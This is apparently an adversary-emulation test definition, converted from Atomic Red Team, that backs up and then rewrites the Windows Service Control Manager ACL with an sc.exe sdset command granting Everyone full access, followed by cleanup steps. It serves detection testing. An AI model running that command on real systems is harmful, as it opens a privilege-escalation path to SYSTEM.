@@ -1,0 +1,49 @@
+# Converted from Atomic Red Team - System Services: Service Execution
+# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1569.002
+# Original auto_generated_guid: bf07f520-3909-4ef5-aa22-877a50f2f77b
+
+---
+api_version: 2.0
+uuid: b588a21a-c4da-4deb-99e5-2db812045f71
+name: Modifying ACL of Service Control Manager via SDSET
+authors:
+  - isaac_fletcher
+  - Atomic Red Team
+description: |
+  Modify permissions of Service Control Manager via SDSET. This allows any administrative user to escalate privilege and create a service with SYSTEM level privileges. Restart is required.
+  [Blog](https://0xv1n.github.io/posts/scmanager/)
+
+mitre:
+  tactics:
+    - TA0002 Execution
+  techniques:
+    - T1569 System Services
+  subtechniques:
+    - T1569.002 Service Execution
+
+requirements:
+  platforms:
+    - os: windows
+  superuser: true
+
+args:
+  - name: backup_file_path
+    default: "C:\\Users\\Public\\scmanager_acl_backup.txt"
+
+steps:
+  - name: backup_scmanager_acl
+    executor: cmd.exe
+    inline: |
+      sc.exe sdshow scmanager > {{.Args.backup_file_path}}
+    cleanup:
+      executor: powershell.exe
+      inline: |
+        Remove-Item -Path {{.Args.backup_file_path}}
+  - name: modify_scmanager_acl
+    executor: cmd.exe
+    inline: |
+      sc.exe sdset scmanager D:(A;;KA;;;WD)
+    cleanup:
+      executor: powershell.exe
+      inline: |
+        sc.exe sdset scmanager (Get-Content {{.Args.backup_file_path}})
